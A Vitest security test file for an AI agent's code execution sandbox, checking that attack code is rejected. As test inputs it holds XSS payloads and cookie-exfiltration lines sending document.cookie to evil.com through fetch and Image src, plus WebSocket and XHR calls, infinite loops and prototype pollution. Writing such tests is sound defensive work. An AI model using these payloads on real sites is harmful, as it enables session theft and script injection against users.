/** @vitest-environment jsdom */
import { describe, it, expect } from 'vitest';
import { ExecutionSandbox } from '@/agent/execution-sandbox/sandbox';
import { DEFAULT_POLICY } from '@/agent/execution-sandbox/types';

describe('Security Audit: Attack Vectors', () => {

    describe('1. Cross-Site Scripting (XSS)', () => {
        it('should block document.write', async () => {
            const code = 'document.write("<script>alert(1)</script>")';
            const result = await ExecutionSandbox.execute(code);
            if (result.success) console.error('FAILED: document.write succeeded');
            else console.log('PASSED: should block document.write');
            expect(result.success).toBe(false);
            expect(result.violations[0].message).toMatch(/Forbidden|restricted/i);
        });

        it('should block innerHTML with script tags', async () => {
            const code = 'document.body.innerHTML = "<img src=x onerror=alert(1)>"';
            const result = await ExecutionSandbox.execute(code);
            if (result.success) console.error('FAILED: innerHTML succeeded');
            else console.log('PASSED: should block innerHTML with script tags');
            expect(result.success).toBe(false);
        });

        it('should block outerHTML assignment', async () => {
            const code = 'document.body.outerHTML = "<div>pwnd</div>"';
            const result = await ExecutionSandbox.execute(code);
            if (result.success) console.error('FAILED: outerHTML succeeded');
            else console.log('PASSED: should block outerHTML assignment');
            expect(result.success).toBe(false);
        });
    });

    describe('2. Data Exfiltration', () => {
        it('should block fetch', async () => {
            const code = 'await fetch("https://evil.com?cookie=" + document.cookie)';
            const result = await ExecutionSandbox.execute(code);
            if (result.success) console.error('FAILED: fetch succeeded');
            else console.log('PASSED: should block fetch');
            expect(result.success).toBe(false);
        });

        it('should block XMLHttpRequest', async () => {
            const code = 'const xhr = new XMLHttpRequest(); xhr.open("GET", "https://evil.com"); xhr.send();';
            const result = await ExecutionSandbox.execute(code);
            if (result.success) console.error('FAILED: XHR succeeded');
            else console.log('PASSED: should block XMLHttpRequest');
            expect(result.success).toBe(false);
            expect(result.violations[0].message).toContain('Forbidden identifier');
        });

        it('should block WebSocket', async () => {
            const code = 'new WebSocket("wss://evil.com")';
            const result = await ExecutionSandbox.execute(code);
            if (result.success) console.error('FAILED: WebSocket succeeded');
            else console.log('PASSED: should block WebSocket');
            expect(result.success).toBe(false);
        });

        it('should block Image src exfiltration', async () => {
            const code = 'const img = new Image(); img.src = "https://evil.com?c=" + document.cookie;';
            const result = await ExecutionSandbox.execute(code);
            if (result.success) console.error('FAILED: Image src succeeded');
            else console.log('PASSED: should block Image src exfiltration');
            expect(result.success).toBe(false);
        });
    });

    describe('3. Denial of Service (DoS)', () => {
        it('should timeout infinite loops', async () => {
            const code = 'while(true) {}';
            const result = await ExecutionSandbox.execute(code, {}, { ...DEFAULT_POLICY, maxExecutionTimeMs: 100 });
            if (result.success) console.error('FAILED: loop succeeded');
            else {
                console.log('Loop failed with:', result.violations[0]);
                console.log('PASSED: should timeout infinite loops');
            }

            expect(result.success).toBe(false);
            expect(result.violations[0].message).toMatch(/Timeout|exceeded/i);
        });

        it('should timeout infinite recursion', async () => {
            const code = 'function recurse() { recurse(); } recurse();';
            const result = await ExecutionSandbox.execute(code, {}, { ...DEFAULT_POLICY, maxExecutionTimeMs: 100 });
            if (result.success) console.error('FAILED: recursion succeeded');
            else console.log('PASSED: should timeout infinite recursion');
            expect(result.success).toBe(false);
            const isTimeoutOrRuntime = result.violations[0].type === 'timeout' || result.violations[0].type === 'runtime_error';
            expect(isTimeoutOrRuntime).toBe(true);
        });
    });

    describe('4. Prototype Pollution & Globals', () => {
        it('should block access to Object.prototype', async () => {
            const code = 'Object.prototype.evil = true;';
            const result = await ExecutionSandbox.execute(code);
            if (result.success) console.error('FAILED: prototype pollution succeeded');
            else console.log('PASSED: should block access to Object.prototype');
            expect(result.success).toBe(false);
        });

        it('should block access to top/parent', async () => {
            const code = 'window.top.location.href = "hacked"';
            const result = await ExecutionSandbox.execute(code);
            if (result.success) console.error('FAILED: top access succeeded');
            else console.log('PASSED: should block access to top/parent');
            expect(result.success).toBe(false);
        });
    });
});
